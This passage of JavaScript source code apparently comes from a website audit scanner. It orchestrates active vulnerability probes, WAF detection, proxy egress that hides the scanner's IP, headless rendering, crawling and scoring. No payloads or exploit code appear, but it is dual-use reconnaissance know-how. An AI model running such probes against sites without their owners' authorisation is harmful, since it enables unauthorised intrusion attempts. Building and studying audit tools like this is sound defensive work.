  const raw = (u, o) => rawRequest(u, { ...o, bypassProxy: bypassProxy || (o && o.bypassProxy) });
  const ip = primaryIp || (meta && meta.primaryIp);
  const probeOpts = { skipActive: Boolean(skipActive) };
  const tasks = [
    ['open-redirect', () => probes.checkOpenRedirect(origin, raw, findings, meta, mkProbe, probeOpts)],
    ['reflected-input', () => probes.checkReflectedInput(origin, raw, findings, meta, mkProbe, probeOpts)],
    ['host-header', () => probes.checkHostHeader(origin, raw, findings, meta, mkProbe, probeOpts)],
    ['http-methods', () => probes.checkHttpMethods(origin, raw, findings, meta, mkProbe, probeOpts)],
    ['directory-listing', () => probes.checkDirectoryListing(origin, raw, findings, meta, mkProbe, probeOpts)],
    ['crossdomain-policy', () => probes.checkCrossdomainPolicy(origin, raw, findings, meta, mkProbe, probeOpts)],
    ['graphql-introspection', () => probes.checkGraphqlIntrospection(origin, raw, findings, meta, mkProbe, probeOpts)],
    ['api-error-verbose', () => probes.checkApiErrorVerbosity(origin, raw, findings, meta, mkProbe, probeOpts)],
    ['open-buckets', () => probes.checkOpenBuckets(html, jsText, raw, findings, meta, mkProbe, probeOpts)],
    ['sensitive-files', () => probes.checkSensitiveFiles(origin, raw, findings, meta, mkProbe, probeOpts)],
    ['source-maps', () => probes.checkSourceMaps(origin, html, raw, findings, meta, mkProbe, probeOpts)],
    ['cors-misconfig', () => probes.checkCorsMisconfiguration(origin, raw, findings, meta, mkProbe, probeOpts)],
    ['admin-debug', () => probes.checkAdminDebugEndpoints(origin, raw, findings, meta, mkProbe, probeOpts)],
    ['shodan', () => probes.checkShodan(ip, findings, meta, mkProbe)],
  ];
  await Promise.all(tasks.map(async ([label, fn]) => {
    try { await fn(); } catch (e) {
      meta.probes = meta.probes || {};
      meta.probes[label] = { error: e.message };
    }
  }));

  // Synchronous (no network) surface checks. These push into the array given.
  safeRun(() => probes.checkWebSockets(html, jsText, origin, findings, meta, mkProbe), 'ws', meta);
  safeRun(() => probes.checkSupplyChain(html, origin, findings, meta, mkProbe), 'supply-chain', meta);
  safeRun(() => probes.checkExtendedSecrets(html, jsText, findings, meta, mkProbe), 'secrets-ext', meta);
}

async function scan(inputTarget, options = {}) {
  const started = Date.now();
  const findings = [];
  const meta = {};
  const onProgress = typeof options.onProgress === 'function' ? options.onProgress : null;

  onProgress && onProgress('dns', { phaseIdx: 0, msg: 'Preverjam DNS zapise in TLS certifikat …' });

  // P0 — capabilities expected but missing, collected during the scan so the
  // finished report can be marked `degraded` and have its score capped.
  const degradedCaps = [];
  const degradedReasons = [];

  const deepScan = options.deep !== false;          // master switch
  const skipActive = options.skipActive !== undefined ? Boolean(options.skipActive) : process.env.VIBESCAN_PUBLIC === '1';
  meta.scanMode = skipActive ? 'passive' : 'active';
  const maxPages = Math.min(Math.max(parseInt(options.maxPages, 10) || 25, 1), 60);
  const maxDepth = Math.min(Math.max(parseInt(options.maxDepth, 10) || 2, 0), 4);

  // Auth-aware scanning: caller-supplied headers (e.g. a session Cookie) are
  // applied to the initial fetch so private/staging sites can be audited.
  // Never logged, never persisted into the report.
  const authHeaders = (options.headers && typeof options.headers === 'object') ? options.headers : null;

  let target = (inputTarget || '').trim();
  if (!/^https?:\/\//i.test(target)) target = 'https://' + target;

  const resolvedHost = await assertPublicHost(new URL(target).hostname);
  const resolvedIp = resolvedHost.addresses.join(', ');

  const maxRedirects = options.followRedirects === false ? 0 : 5;
  let res;
  let usedBypassProxy = false;
  // The scan must egress through SCANNER_PROXY. It previously retried a failed
  // proxied fetch directly from the host, which leaked the host's public IP to
  // the target. A failed proxied request is a real result, not a prompt to
  // reveal our own address.
  res = await rawRequest(target, { headers: authHeaders, maxRedirects });

  // A 403/429/WAF challenge from the proxied request is the answer. It used to
  // trigger a direct retry from the host IP so "real headers could be captured";
  // that revealed our own address to the target, which is exactly what the
  // proxy exists to prevent. Report the block instead.
  if (egress.tiers().length > 0 && (res.status === 403 || res.status === 429 || isWafChallenge(res, res.body))) {
    meta.proxiedBlocked = true;
  }

  const origin = new URL(res.url).origin;

  // The headless renderer must pin DNS to the *final* host's validated public
  // IP (the target may have redirected to a different hostname).
  const finalHost = new URL(res.url).hostname;
  const finalResolved = finalHost === new URL(target).hostname
    ? resolvedHost
    : await assertPublicHost(finalHost).catch(() => resolvedHost);
  const primaryIp = finalResolved.addresses.find((a) => net.isIPv4(a)) || finalResolved.addresses[0];
  meta.primaryIp = primaryIp;

  const wafCheck = detectWaf(res, res.body);
  if (wafCheck.isWaf) {
    meta.isWafChallenge = true;
    meta.wafProvider = wafCheck.provider || 'WAF';
  }

  // Header Harvesting Fallback:
  // Peripheral fetch for robots.txt (and others) to harvest real origin security headers
  // if homepage was challenged or blocked, or security headers were stripped.
  // Never bypass the proxy for peripherals. peripheralBypass used to be
  // `usedBypassProxy || meta.isWafChallenge`, so exactly when a target blocked
  // or challenged us, /robots.txt, /sitemap.xml and /.well-known/security.txt
  // were fetched from the VPS IP -- the leak this whole change removes.
  const peripheralBypass = false;
  const [robots, sitemap, securityTxt, llms, llmsFull] = await Promise.all([
    fetchPeripheral(origin, '/robots.txt', peripheralBypass),
    fetchPeripheral(origin, '/sitemap.xml', peripheralBypass),
    fetchPeripheral(origin, '/.well-known/security.txt', peripheralBypass),
    fetchPeripheral(origin, '/llms.txt', peripheralBypass),
    fetchPeripheral(origin, '/llms-full.txt', peripheralBypass),
  ]);

  if (robots && robots.status === 200 && robots.headers) {
    const HARVEST_SECURITY_HEADERS = [
      'strict-transport-security',
      'content-security-policy',
      'content-security-policy-report-only',
      'x-content-type-options',
      'x-frame-options',
      'referrer-policy',
      'permissions-policy',
      'cross-origin-opener-policy',
      'cross-origin-embedder-policy',
      'cross-origin-resource-policy',
      'x-xss-protection',
    ];
    const harvested = [];
    for (const hdr of HARVEST_SECURITY_HEADERS) {
      if (robots.headers[hdr] && (!res.headers[hdr] || meta.isWafChallenge)) {
        res.headers[hdr] = robots.headers[hdr];
        harvested.push(hdr);
      }
    }
    if (harvested.length > 0) {
      meta.headersHarvested = true;
      meta.harvestedHeaders = harvested;
    }
  }

  if (meta.isWafChallenge) {
    const providerName = meta.wafProvider || 'WAF';
    findings.push(makeFinding({
      id: 'waf-challenge-intercepted',
      domain: 'security',
      severity: 'info',
      title: `WAF / Bot challenge intercepted request (${providerName})`,
      detail: `The domain is protected by ${providerName} Bot Management / WAF which intercepted the automated request (HTTP ${res.status}). Content-level heuristics (SEO tags, legal links, accessibility) were suspended to avoid false positives on the interstitial challenge markup.${meta.headersHarvested ? ` Origin security headers (${meta.harvestedHeaders.join(', ')}) were successfully harvested via /robots.txt.` : ''}`,
      fix: 'No fix needed; this indicates active DDoS and automated bot challenge protection.',
    }));
  }

  onProgress && onProgress('headers', { phaseIdx: 1, msg: 'Preverjam varnostne glave in piškotke …' });

  checkTransport(res, findings, meta);
  checkSecurityHeaders(res, findings, meta);
  checkModernHeaders(res, findings, meta);
  checkCookies(res, findings, meta);
  checkBody(res.body, res, findings, meta);
  checkCors(res, findings, meta);
  checkTech(res, res.body, findings, meta);

  const peripherals = { robots, sitemap, securityTxt, llms, llmsFull, headers: res.headers };

  checkCompliance(res.body, res, findings, meta, peripherals);
  checkSeo(res.body, res, findings, meta, peripherals);
  checkQuality(res.body, res, findings, meta);

  // ---- Phase 4/5/6/7 module wiring (each is best-effort, non-fatal) ----
  if (!meta.isWafChallenge) {
    safeRun(() => {
      for (const f of eu.checkEuCompliance(res.body, res, findings, meta, peripherals, mkEu)) findings.push(f);
    }, 'eu', meta);
    safeRun(() => {
      for (const f of a11y.checkA11yStatic(res.body, [], meta, mkA11y)) findings.push(f);
    }, 'a11y-static', meta);
    // The seo module pushes straight into the array it is given (no return value).
    safeRun(() => {
      seoLib.checkJsonLd(res.body, origin, findings, meta, mkSeo, peripherals, res);
      seoLib.checkIndexability(res.body, origin, res, findings, meta, mkSeo, peripherals);
    }, 'seo-2026', meta);
  }
  safeRun(() => {
    seoLib.checkAiCrawlerPolicy(res.body, origin, findings, meta, mkSeo, peripherals);
  }, 'seo-ai-policy', meta);

  const apexHost = (new URL(res.url).hostname || '').replace(/^www\./i, '');

  // Extended sweeps — run concurrently, each is best-effort. checkJsBundles
  // must finish first: it populates meta.jsBundleText which the Phase 6 probes
  // (buckets / WebSockets / secrets / PII) then scan.
  await Promise.all([
    checkDnsSecurity(new URL(res.url).hostname, res, findings, meta),
    skipActive ? Promise.resolve() : checkPathExposure(origin, findings, meta),
    checkJsBundles(res.body, origin, findings, meta),
    checkBrokenLinks(res.body, origin, findings, meta),
    checkGoogleCrux(res.url, findings, meta, mkSeo, mkPerf),
    ctRecon.checkSubdomains(apexHost, findings, meta, mkProbe).catch((e) => {
      meta.ct = { count: 0, sample: [], staging: [], admin: [], error: e.message };
    }),
  ]);
  await runProbes(res.body, origin, findings, meta, primaryIp, usedBypassProxy, skipActive);

  /* ---------------------------------------------------------------- *
   * DEEP LAYER (opt-in via options.deep, on by default):
   *   1. headless render  — scan the post-JS DOM for SPAs
   *   2. BFS crawl        — sweep the whole same-origin site
   *   3. Firecrawl map    — optional extra subpage discovery
   * ---------------------------------------------------------------- */
  if (deepScan) {
    const deepMeta = {};
    const effectiveRes = { ...res };

    // (1) Headless render if the HTML looks like a client-rendered shell.
    if (!meta.isWafChallenge && deep.looksLikeSpa(res.body)) {
      // Always proxied. Passing usedBypassProxy here meant the renderer went
      // direct whenever the fetch above had fallen back, so the target saw the
      // VPS IP from a HeadlessChrome user agent.
      const rendered = await deep.renderWithHeadless(res.url, primaryIp, { bypassProxy: false });
      deepMeta.render = { attempted: true, ok: !!rendered.ok, length: rendered.length || 0, error: rendered.error || null };
      if (!rendered.ok && options.performance === false) {
        // The page is a JS shell and we could not render it: its body was never
        // really scanned, so several content checks never ran. Degrade.
        degradedCaps.push(integrity.RENDER_CAPABILITY);
        degradedReasons.push(rendered.error || 'SPA render failed');
      }
      if (rendered.ok && rendered.dom && rendered.dom.length > res.body.length) {
        effectiveRes.body = rendered.dom;
        meta.rendered = true;
        // Held only for the fingerprint pass below, then deleted — the rendered
        // HTML must never be persisted (PLAN-LEADERBOARD.md §2.1).
        meta.renderBody = rendered.dom;
        // Re-run content-based checks on the rendered DOM (headers/TLS stay same).
        const renderedFindings = [];
        checkBody(rendered.dom, effectiveRes, renderedFindings, meta);
        for (const f of renderedFindings) {
          if (!findings.some((x) => x.id === f.id)) findings.push(f);
        }
      }
    }

    // (1b) Phase 3 + Phase 4 — one headless pass yields Core Web Vitals lab
    // metrics, computed-style contrast data, and the post-JS DOM for the
    // rendered a11y suite. Opt out with options.performance === false.
    if (options.performance !== false) {
      onProgress && onProgress('cwv', { phaseIdx: 2, msg: 'Merim hitrost delovanja in Core Web Vitals …' });
      try {
        const live = await webvitals.measure(res.url, { resolvedIp: primaryIp, timeoutMs: 28000, bypassProxy: usedBypassProxy });
        if (live.ok) {
          deepMeta.performance = { ok: true };

          const domDocStatus = live.docStatus || (live.metrics && live.metrics.docStatus) || 0;
          const domWaf = detectWaf({ status: domDocStatus || res.status, headers: live.docHeaders || res.headers }, live.dom);
          const isDomErrorOrBlock = (domDocStatus === 403 || domDocStatus === 429 || domDocStatus === 503) ||
            domWaf.isWaf ||
            /<title>[^<]*(?:Just a moment|Security Checkpoint|Checking your browser|Attention Required|Cloudflare|ddos protection|403 Forbidden|Access Denied|Error 403|429 Too Many|503 Service)[^<]*<\/title>/i.test(live.dom) ||
            /<h[12]>[^<]*(?:403\s+Forbidden|Access\s+Denied|Request\s+forbidden)[^<]*<\/h[12]>/i.test(live.dom) ||
            /\/hcdn-cgi\/jschallenge|challenges\.cloudflare\.com|geo\.captcha-delivery\.com/i.test(live.dom) ||
            (/openresty|nginx/i.test(live.dom) && /403\s+Forbidden/i.test(live.dom) && live.dom.length < 4096);

          // Only score CWV if Headless Chrome actually rendered the genuine site, not a 403/WAF block
          if (!isDomErrorOrBlock) {
            meta.cwv = live.metrics || null;
            const perfFindings = [];
            safeRun(() => seoLib.checkCwv(live.metrics, perfFindings, meta, mkPerf), 'cwv', meta);
            for (const f of perfFindings) {
              if (!findings.some((x) => x.id === f.id)) findings.push(f);
            }
          }

          // Post-JS DOM reconciliation: re-run DOM-dependent SEO, JSON-LD,
          // and static A11y checks against rendered Chromium DOM so
          // client-hydrated tags (<title>, <h1>, <main>, JSON-LD, meta
          // description) do not produce unhydrated false positives.
          if (isDomErrorOrBlock) {
            const originWaf = detectWaf(res, res.body);
            const originBlocked = res.status === 403 || res.status === 429 || originWaf.isWaf || !res.body;
            if (originBlocked) {
              meta.isWafChallenge = true;
              if (!meta.wafProvider && domWaf.provider) meta.wafProvider = domWaf.provider;
              if (!findings.some((x) => x.id === 'waf-challenge-intercepted')) {
                const providerName = meta.wafProvider || 'WAF';
                findings.push(makeFinding({
                  id: 'waf-challenge-intercepted',
                  domain: 'security',
                  severity: 'info',
                  title: `WAF / Bot challenge intercepted request (${providerName})`,
                  detail: `The domain is protected by ${providerName} Bot Management / WAF which intercepted the automated request (HTTP ${res.status}). Content-level heuristics (SEO tags, legal links, accessibility) were suspended to avoid false positives on the interstitial challenge markup.${meta.headersHarvested ? ` Origin security headers (${meta.harvestedHeaders.join(', ')}) were successfully harvested via /robots.txt.` : ''}`,
                  fix: 'No fix needed; this indicates active DDoS and automated bot challenge protection.',
                }));
              }
            } else {
              // Origin HTML is authentic (HTTP 200, full payload); Headless Chrome encountered a checkpoint or 403 block.
              // Skip DOM reconciliation to avoid scanning checkpoint interstitial, but do NOT degrade scan.
              meta.domChallengeBypassed = false;
              if (res.via === 'firecrawl' && res.body) {
                meta.renderBody = res.body;
              }
            }
          } else if (live.dom && live.dom.length > 0) {
            meta.renderBody = live.dom;
            const domRes = { ...res, body: live.dom };
            const postJsFindings = [];
            checkSeo(live.dom, domRes, postJsFindings, meta, peripherals);
            checkQuality(live.dom, domRes, postJsFindings, meta);
            safeRun(() => {
              for (const f of a11y.checkA11yStatic(live.dom, [], meta, mkA11y)) postJsFindings.push(f);
            }, 'a11y-static-reconcile', meta);
            safeRun(() => {
              seoLib.checkJsonLd(live.dom, origin, postJsFindings, meta, mkSeo, peripherals, domRes);
              seoLib.checkAiCrawlerPolicy(live.dom, origin, postJsFindings, meta, mkSeo, peripherals);
              seoLib.checkIndexability(live.dom, origin, domRes, postJsFindings, meta, mkSeo, peripherals);
            }, 'seo-jsonld-reconcile', meta);

            const RECONCILE_PREFIXES = ['seo-', 'a11y-', 'slop-', 'img-format', 'inline-scripts', 'deprecated'];
            const isReconciledId = (id) => RECONCILE_PREFIXES.some((p) => String(id).startsWith(p));
            for (let idx = findings.length - 1; idx >= 0; idx--) {
              if (isReconciledId(findings[idx].id)) {
                findings.splice(idx, 1);
              }
            }
            for (const f of postJsFindings) {
              if (!findings.some((x) => x.id === f.id)) findings.push(f);
            }

            // Post-hydration consent reconciliation: If rendered DOM has a CMP / banner
            // that was injected client-side via React or external script, reconcile no-consent.
            const consentReRender = /cookie[- _]?consent|cookie[ _-]?banner|consent[- _]?management|termly|app\.termly\.io|essential cookies|non-essential cookies|with your consent|preferences.*decline.*accept|klaro|onetrust|cookiebot|cookieyes|complianz|iubenda|didomi|privacy-center\.org|spcloader|usercentrics|sourcepoint|axeptio|borlabs|tarteaucitron|gdpr[- _]?consent|nastavitve piškotkov|cookie-trigger|cookie-modal|gtag\(['"]consent['"]|type=["'](?:didomi\/javascript|text\/plain|text\/consent)/i;
            if (consentReRender.test(live.dom)) {
              for (let idx = findings.length - 1; idx >= 0; idx--) {
                if (findings[idx].id === 'no-consent' || findings[idx].id === 'eu-no-cmp') {
                  findings.splice(idx, 1);
                }
              }
              if (!findings.some((x) => x.id === 'consent-present')) {
                findings.push(makeFinding({
                  id: 'consent-present',
                  domain: 'compliance',
                  severity: 'info',
                  title: 'Consent mechanism detected (post-hydration)',
                  detail: 'A consent pattern (e.g. CMP banner) was detected after client-side hydration. Verify analytics and trackers are actually blocked *before* consent.',
                  fix: 'Test with cookies cleared: no analytics request should fire before the user accepts.',
                }));
              }
            }
          }

          // checkA11yRendered RETURNS its findings (it does not mutate the
          // array passed in). Discarding the return value silently dropped
          // every rendered-DOM a11y finding (contrast violations, JS-injected
          // images without alt). Capture and merge it.
          if (!isDomErrorOrBlock) {
            let a11yFindings = [];
            safeRun(() => { a11yFindings = a11y.checkA11yRendered(live.dom, live.contrast, [], meta, mkA11y) || []; }, 'a11y-rendered', meta);
            for (const f of a11yFindings) {
              if (!findings.some((x) => x.id === f.id)) findings.push(f);
            }

            // Post-hydration JS bundle reconciliation:
            // When initial HTML was fetched via Firecrawl, SSR stripped scripts, or an SPA dynamically injected scripts,
            // checkJsBundles was either skipped or saw 0 scripts. Chromium rendered DOM contains the real script tags.
            const renderedScripts = collectScripts(live.dom, origin);
            if (renderedScripts.length > (meta.bundleUrls ? meta.bundleUrls.length : 0)) {
              const bundleFindings = [];
              await checkJsBundles(live.dom, origin, bundleFindings, meta);
              for (const f of bundleFindings) {
                if (!findings.some((x) => x.id === f.id)) findings.push(f);
              }
              if (meta.jsBundleText) {
                const probeFindings = [];
                safeRun(() => probes.checkExtendedSecrets(live.dom, meta.jsBundleText, probeFindings, meta, mkProbe), 'secrets-ext-reconcile', meta);
                safeRun(() => probes.checkWebSockets(live.dom, meta.jsBundleText, origin, probeFindings, meta, mkProbe), 'ws-reconcile', meta);
                safeRun(() => probes.checkSupplyChain(live.dom, origin, probeFindings, meta, mkProbe), 'supply-chain-reconcile', meta);
                for (const f of probeFindings) {
                  if (!findings.some((x) => x.id === f.id)) findings.push(f);
                }
              }
            }

            // Tech stack reconciliation from rendered DOM (restores Next.js, React, etc. if initial fetch was stripped)
            const renderedTech = detectTech(res, live.dom);
            if (renderedTech && renderedTech.length) {
              meta.tech = Array.from(new Set([...(meta.tech || []), ...renderedTech]));
            }
          }
          meta.rendered = true;
        } else {
          // P0: the renderer is the thing that keeps perf + rendered-a11y
          // honest. When it is unavailable those domains go empty and the mean
          // score goes *up*. Record it so the report can be capped + flagged.
          deepMeta.performance = { ok: false, error: live.error || 'unavailable' };
          if (res.via !== 'firecrawl') {
            degradedCaps.push(integrity.RENDER_CAPABILITY);
            degradedReasons.push(live.error || 'headless renderer unavailable');
          }
        }
      } catch (e) {
        deepMeta.performance = { ok: false, error: e.message };
        if (res.via !== 'firecrawl') {
          degradedCaps.push(integrity.RENDER_CAPABILITY);
          degradedReasons.push(e.message);
        }
      }
    }

    // (2) Same-origin BFS crawl.
    onProgress && onProgress('crawl', { phaseIdx: 3, msg: 'Pregledujem podstrani spletnega mesta …' });
    const crawl = await deep.crawlSite(res.url, rawRequest, { maxPages, maxDepth, concurrency: 5 });
    deepMeta.crawl = { pagesScanned: crawl.pagesScanned, discovered: crawl.discovered };

    const pageResults = [];
    const rootNorm = new URL(res.url).toString();
    for (const p of crawl.pages) {
      // Skip the root page — already scanned above (normalise trailing slash).
      let pUrlNorm = p.url;
      let pFinalNorm = p.finalUrl || p.url;
      try { pUrlNorm = new URL(p.url).toString(); } catch (e) {}
      try { pFinalNorm = new URL(p.finalUrl || p.url).toString(); } catch (e) {}
      if (pFinalNorm === rootNorm || pUrlNorm === rootNorm) continue;
      if (p.status !== 200) continue;
      const pr = runPageChecks(p);
      if (pr.findings.length) pageResults.push({ url: p.url, findings: pr.findings });
    }

    // Merge crawl findings into the root set (de-duplicated by issue id).
    if (pageResults.length) {
      const merged = mergePageFindings(findings, pageResults);
      findings.length = 0;
      findings.push(...merged);
      meta.crawledPages = crawl.pagesScanned;
      meta.crawlPagesWithFindings = pageResults.length;
    } else {
      meta.crawledPages = crawl.pagesScanned;
    }

    // Re-check legal-policy and EU compliance presence now that we have both
    // the post-JS rendered DOM (`meta.renderBody`) and every crawled page body.
    // This clears false "no privacy policy" / "no documented transfer mechanism"
    // findings on SPAs and sites that publish disclosures on `/legal` or `/privacy`.
    const allCorpusBodies = [res.body, meta.renderBody, ...crawl.pages.map((p) => p.body)].filter(Boolean);
    meta._policyCorpus = allCorpusBodies;
    checkPolicies(allCorpusBodies, findings, meta);
    safeRun(() => {
      if (!meta.isWafChallenge) {
        const euReconciled = eu.checkEuCompliance(meta.renderBody || res.body, res, findings, meta, peripherals, mkEu);
        for (let idx = findings.length - 1; idx >= 0; idx--) {
          const fid = String(findings[idx].id);
          if (fid.startsWith('eu-') || fid.startsWith('us-') || fid.startsWith('privacy-')) findings.splice(idx, 1);
        }
        for (const f of euReconciled) {
          if (!findings.some((x) => x.id === f.id)) findings.push(f);
        }
      } else {
        for (let idx = findings.length - 1; idx >= 0; idx--) {
          const fid = String(findings[idx].id);
          if (fid.startsWith('eu-') || fid.startsWith('us-') || fid.startsWith('privacy-')) findings.splice(idx, 1);
        }
      }
    }, 'eu-reconcile', meta);
    delete meta._policyCorpus;

    // (3) Optional Firecrawl subpage discovery (only surfaces new URLs).
    if (process.env.FIRECRAWL_API_KEY) {
      const fc = await deep.firecrawlDiscover(res.url, { limit: 50 });
      deepMeta.firecrawl = fc.ok ? { ok: true, links: (fc.links || []).length } : { ok: false, error: fc.error || fc.reason };
      if (fc.ok && Array.isArray(fc.links) && fc.links.length) {
        const known = new Set(crawl.pages.map((p) => (p.finalUrl || p.url).replace(/#.*$/, '')));
        const extra = fc.links
          .filter((l) => { try { return new URL(l).origin === origin; } catch (e) { return false; } })
          .filter((l) => !known.has(l.replace(/#.*$/, '')))
          .slice(0, 15);
        meta.firecrawlExtraLinks = extra.length;
        if (extra.length) meta.firecrawlLinks = extra.slice(0, 40);
      }
    }

    meta.deep = deepMeta;
  }

  if (!meta.isWafChallenge && (!securityTxt || securityTxt.status !== 200)) {
    findings.push(makeFinding({
      id: 'no-security-txt',
      domain: 'security',
      severity: 'info',
      title: 'No /.well-known/security.txt',
      detail: 'Makes it hard for researchers to report vulnerabilities responsibly.',
      fix: 'Publish security.txt with a contact and expiry.',
    }));
  }

  applyExplain(findings); // attach whatItIs / whoCanAct / impact / worstCase

  // Leaderboard provenance fingerprint (PLAN-LEADERBOARD.md §4).
  //
  // Runs AFTER the deep layer on purpose: on a client-rendered site the raw
  // response is an empty Vite/Next shell, so fingerprinting it finds no footer,
  // no credits and no platform. `meta.render.body` holds the post-JS DOM when
  // the renderer succeeded, and that is what a human sees.
  //
  // A failure here must never fail a scan that already succeeded, and the extra
  // same-origin GETs are skipped when the caller opts out.
  try {
    const fpBody = meta.renderBody || res.body;
    meta.build = await buildfp.collect(
      fpBody,
      res,
      options.fingerprint === false ? null : { rawRequest }
    );
    if (meta.renderBody) meta.build.usedRenderedDom = true;
    delete meta.renderBody; // never persist the rendered document itself
  } catch (e) {
    meta.build = { error: String(e && e.message ? e.message : e) };
  }

  if (meta.isWafChallenge) {
    degradedCaps.push('waf-intercepted');
    degradedReasons.push(`Target protected by ${meta.wafProvider || 'WAF'} bot challenge (HTTP ${res.status}); content checks suspended`);
  }

  // P0 — if any expected capability was missing, make the report say so *and*
  // add a finding, so a degraded run can never be mistaken for a clean one.
  const degraded = integrity.buildDegraded(degradedCaps, degradedReasons.find(Boolean));
  if (degraded) {
    const f = integrity.degradedFinding(degraded);
    if (f && !findings.some((x) => x.id === f.id)) findings.push(f);
  }

  const order = { critical: 0, high: 1, medium: 2, low: 3, info: 4 };
  findings.sort((a, b) => order[a.severity] - order[b.severity]);

  onProgress && onProgress('scoring', { phaseIdx: 3, msg: 'Zaključujem analizo in računanje ocene …' });

  const scored = scoreFindings(findings);
  const domains = scoreByDomain(findings);
  const counts = findings.reduce((acc, f) => {
    acc[f.severity] = (acc[f.severity] || 0) + 1;
    return acc;
  }, {});

  const report = {
    target,
    finalUrl: res.url,
    resolvedIp,
    startedAt: new Date(started).toISOString(),
    durationMs: Date.now() - started,
    status: res.status,
    score: scored.score,
    grade: scored.grade,
    // Severity ceiling actually applied (100 = none) — explains the headline score.
    scoreCeiling: scoreCeiling(findings),
    domainAverage: scored.domainScore,
    penalty: scored.penalty,
    domains,
    counts,
    findings,
    meta,
  };

  // P0 — stamp `degraded` and apply the score cap last, after every finding
  // (including the synthetic degraded finding) has been counted.
  integrity.applyDegraded(report, degraded);

  // Hard Invariant Guard: An unverified or WAF-intercepted scan can NEVER
  // masquerade as an A or B grade. Enforce absolute score ceiling.
  if ((meta.isWafChallenge || (degraded && degraded.degraded)) && typeof report.score === 'number' && report.score > (degraded ? degraded.scoreCap : 70)) {
    report.score = degraded ? degraded.scoreCap : 70;
    report.grade = integrity.gradeFor(report.score);
  }

  return report;
}

const EXPLOIT_STEPS = EXPLOIT;

module.exports = { scan, rawRequest, assertPublicHost, checkQuality, checkGoogleCrux, EXPLAIN, EXPLOIT, EXPLOIT_STEPS, detectTech, checkTech, checkPolicies, egressState, scanSecrets, detectWaf };

/* ------------------------------------------------------------------ *
 * CLI: node lib/scanner.js https://example.com
 * ------------------------------------------------------------------ */
if (require.main === module) {
  const t = process.argv[2];
  if (!t) {
    console.error('usage: node lib/scanner.js <url>');
    process.exit(1);
  }
  scan(t)
    .then((r) => {
      console.log(JSON.stringify({ target: r.target, score: r.score, grade: r.grade, counts: r.counts, findings: r.findings.map((f) => `[${f.severity}] ${f.title}`) }, null, 2));
    })
    .catch((e) => {
      console.error('scan failed:', e.message);
      process.exit(1);
    });
}
